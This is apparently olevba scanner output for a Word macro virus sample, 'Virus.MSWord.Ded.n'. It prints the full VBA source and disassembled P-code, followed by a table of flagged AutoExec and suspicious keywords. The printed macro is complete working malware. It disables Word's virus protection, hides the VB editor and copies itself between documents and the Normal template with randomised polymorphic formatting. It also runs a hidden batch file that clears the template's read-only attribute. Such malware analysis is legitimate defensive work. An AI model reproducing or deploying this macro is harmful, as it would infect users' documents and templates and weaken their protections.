olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.n
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.n - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Document_Close()

         On Error GoTo _
skam

    Options.VirusProtection _
= False

    SWL
'40.13744
          ABS99
'41.27668
skam:
'58.3359
         End Sub
'91.93771
   Private Sub Èäåíòèôèêàòîð()
'47.44592
 End Sub
'39.04715
           Private Sub Document_New()
'8.964139
  End Sub
'58.97926
     Private Sub SWL()
'25.46019
              Application. _
                                                          ShowVisualBasicEditor = False

     If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

             For I = _
1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

            d _
= NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

        If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While _
Mid(d, Len(d) - 1, 2) = " _"

     I = I + 1
'58.45293
  d _
= Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend
'78.21387
 d = e(d)
'46.3584
          ActiveDocument. _
                               VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'80.25874
              Next _
I

  ActiveDocument. _
                                            SaveAs AddToRecentFiles:=False

          End If
'44.11147
  End _
Sub

Private Sub ABS99()
'40.16046
      If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

             f (NormalTemplate. _
FullName)

            For I = 1 To _
ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 d _
= ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

             If Len(d) > 0 _
And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While Mid(d, Len(d) - _
1, 2) = " _"

  I = I _
+ 1

  d = Left(d, Len(d) _
- 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend
'72.94109
            d = e(d)
'55.51133
            NormalTemplate. _
            VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'33.90907
    Next _
I

           NormalTemplate. _
                            Save

     End If
'28.13814
       End Sub
'26.80438
    Private Function e(aString) As _
String

aString = LTrim(aString)
'96.4709
    aString _
= RTrim(aString)

            If aString _
= "Sub " & "Vc()" Then

aString = "Sub " & "ViewVBCode()"
'13.9438
  Else
'42.49291
 If aString _
= "Sub " & "ViewVBCode()" Then

  aString _
= "Sub " & "Vc()"

            End If
'30.66294
      End If
'49.33584
         For I = 1 _
To Len(aString) - 1

              If Mid(aString, _
I, 1) = "." Then

If _
Not Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

  If _
Not Mid(aString, I + 1, 1) = Chr$(34) Then

 e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

     For _
j = 1 To Int(15 * Rnd)

             e = " " & e
'46.8736
        Next j
'80.70413
   Exit Function
'32.68447
         End If
'58.99297
    End If
'58.3927
Else
'38.75368
              If _
Mid(aString, I, 1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

          If Not _
Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

         e = Left(aString, _
I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

            For _
j = 1 To Int(15 * Rnd)

         e = " " & _
e

     Next j
'29.1052
      Exit Function
'76.98775
        End If
'17.76208
 End If
'43.15423
 End _
If

       Next I
'41.63005
      e _
= aString & Chr$(13) & "'" & (100 * Rnd)

     Count _
= Int(15 * Rnd)

        For _
j = 1 To Count

        e _
= " " & e

   Next j
'76.01295
          End Function
'27.8411
          Private _
Sub f(fName)

   If GetAttr(fName) And vbReadOnly Then
'95.71298
Open Dir(fName) _
& ".bat" For Append As #1

             Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

      Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

  Close _
#1

            shellResult = Shell(Dir(fName) & ".bat", vbHide)
'86.16203
End If
'27.48487
     End _
Sub

      Private Sub Document_Open()
'31.58559
End Sub
'78.03816
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.n
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9325 bytes
' Line #0:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	LineCont 0x0004 03 00 00 00
' 	OnError skam 
' Line #3:
' Line #4:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' Line #6:
' 	ArgsCall SWL 0x0000 
' Line #7:
' 	QuoteRem 0x0000 0x0008 "40.13744"
' Line #8:
' 	ArgsCall ABS99 0x0000 
' Line #9:
' 	QuoteRem 0x0000 0x0008 "41.27668"
' Line #10:
' 	Label skam 
' Line #11:
' 	QuoteRem 0x0000 0x0007 "58.3359"
' Line #12:
' 	EndSub 
' Line #13:
' 	QuoteRem 0x0000 0x0008 "91.93771"
' Line #14:
' 	FuncDefn (Private Sub Èäåíòèôèêàòîð())
' Line #15:
' 	QuoteRem 0x0000 0x0008 "47.44592"
' Line #16:
' 	EndSub 
' Line #17:
' 	QuoteRem 0x0000 0x0008 "39.04715"
' Line #18:
' 	FuncDefn (Private Sub Document_New())
' Line #19:
' 	QuoteRem 0x0000 0x0008 "8.964139"
' Line #20:
' 	EndSub 
' Line #21:
' 	QuoteRem 0x0000 0x0008 "58.97926"
' Line #22:
' 	FuncDefn (Private Sub SWL())
' Line #23:
' 	QuoteRem 0x0000 0x0008 "25.46019"
' Line #24:
' 	LineCont 0x0004 02 00 3A 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #25:
' Line #26:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #27:
' Line #28:
' 	LineCont 0x0004 03 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #29:
' Line #30:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #31:
' Line #32:
' 	LineCont 0x0004 05 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #33:
' Line #34:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #35:
' Line #36:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #37:
' 	QuoteRem 0x0000 0x0008 "58.45293"
' Line #38:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #39:
' Line #40:
' 	Wend 
' Line #41:
' 	QuoteRem 0x0000 0x0008 "78.21387"
' Line #42:
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #43:
' 	QuoteRem 0x0000 0x0007 "46.3584"
' Line #44:
' 	LineCont 0x0004 02 00 1F 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #45:
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	QuoteRem 0x0000 0x0008 "80.25874"
' Line #48:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' Line #50:
' 	LineCont 0x0004 02 00 2C 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #51:
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	QuoteRem 0x0000 0x0008 "44.11147"
' Line #54:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #55:
' Line #56:
' 	FuncDefn (Private Sub ABS99())
' Line #57:
' 	QuoteRem 0x0000 0x0008 "40.16046"
' Line #58:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #59:
' Line #60:
' 	LineCont 0x0004 04 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #61:
' Line #62:
' 	LineCont 0x0004 05 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #63:
' Line #64:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #65:
' Line #66:
' 	LineCont 0x0004 07 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #67:
' Line #68:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #69:
' Line #70:
' 	LineCont 0x0004 03 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #71:
' Line #72:
' 	LineCont 0x0004 0A 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #73:
' Line #74:
' 	Wend 
' Line #75:
' 	QuoteRem 0x0000 0x0008 "72.94109"
' Line #76:
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #77:
' 	QuoteRem 0x0000 0x0008 "55.51133"
' Line #78:
' 	LineCont 0x0004 02 00 0C 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	QuoteRem 0x0000 0x0008 "33.90907"
' Line #82:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' Line #84:
' 	LineCont 0x0004 02 00 1C 00
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	QuoteRem 0x0000 0x0008 "28.13814"
' Line #88:
' 	EndSub 
' Line #89:
' 	QuoteRem 0x0000 0x0008 "26.80438"
' Line #90:
' 	LineCont 0x0004 07 00 00 00
' 	FuncDefn (Private Function e(aString, id_FFFE As String) As String)
' Line #91:
' Line #92:
' 	Ld aString 
' 	ArgsLd LTrim 0x0001 
' 	St aString 
' Line #93:
' 	QuoteRem 0x0000 0x0007 "96.4709"
' Line #94:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	ArgsLd RTrim 0x0001 
' 	St aString 
' Line #95:
' Line #96:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #97:
' Line #98:
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	St aString 
' Line #99:
' 	QuoteRem 0x0000 0x0007 "13.9438"
' Line #100:
' 	ElseBlock 
' Line #101:
' 	QuoteRem 0x0000 0x0008 "42.49291"
' Line #102:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #103:
' Line #104:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	St aString 
' Line #105:
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	QuoteRem 0x0000 0x0008 "30.66294"
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	QuoteRem 0x0000 0x0008 "49.33584"
' Line #110:
' 	LineCont 0x0004 04 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #111:
' Line #112:
' 	LineCont 0x0004 05 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #113:
' Line #114:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #115:
' Line #116:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #117:
' Line #118:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #119:
' Line #120:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #121:
' Line #122:
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #123:
' 	QuoteRem 0x0000 0x0007 "46.8736"
' Line #124:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #125:
' 	QuoteRem 0x0000 0x0008 "80.70413"
' Line #126:
' 	ExitFunc 
' Line #127:
' 	QuoteRem 0x0000 0x0008 "32.68447"
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	QuoteRem 0x0000 0x0008 "58.99297"
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	QuoteRem 0x0000 0x0007 "58.3927"
' Line #132:
' 	ElseBlock 
' Line #133:
' 	QuoteRem 0x0000 0x0008 "38.75368"
' Line #134:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #135:
' Line #136:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #137:
' Line #138:
' 	LineCont 0x0004 06 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #139:
' Line #140:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #141:
' Line #142:
' 	LineCont 0x0004 04 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #143:
' Line #144:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #145:
' 	QuoteRem 0x0000 0x0007 "29.1052"
' Line #146:
' 	ExitFunc 
' Line #147:
' 	QuoteRem 0x0000 0x0008 "76.98775"
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	QuoteRem 0x0000 0x0008 "17.76208"
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	QuoteRem 0x0000 0x0008 "43.15423"
' Line #152:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #153:
' Line #154:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #155:
' 	QuoteRem 0x0000 0x0008 "41.63005"
' Line #156:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St e 
' Line #157:
' Line #158:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Count 
' Line #159:
' Line #160:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #161:
' Line #162:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #163:
' Line #164:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #165:
' 	QuoteRem 0x0000 0x0008 "76.01295"
' Line #166:
' 	EndFunc 
' Line #167:
' 	QuoteRem 0x0000 0x0007 "27.8411"
' Line #168:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Private Sub False(fName))
' Line #169:
' Line #170:
' 	Ld fName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	IfBlock 
' Line #171:
' 	QuoteRem 0x0000 0x0008 "95.71298"
' Line #172:
' 	LineCont 0x0004 05 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #173:
' Line #174:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #175:
' Line #176:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #177:
' Line #178:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #179:
' Line #180:
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St shellResult 
' Line #181:
' 	QuoteRem 0x0000 0x0008 "86.16203"
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	QuoteRem 0x0000 0x0008 "27.48487"
' Line #184:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #185:
' Line #186:
' 	FuncDefn (Private Sub Document_Open())
' Line #187:
' 	QuoteRem 0x0000 0x0008 "31.58559"
' Line #188:
' 	EndSub 
' Line #189:
' 	QuoteRem 0x0000 0x0008 "78.03816"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

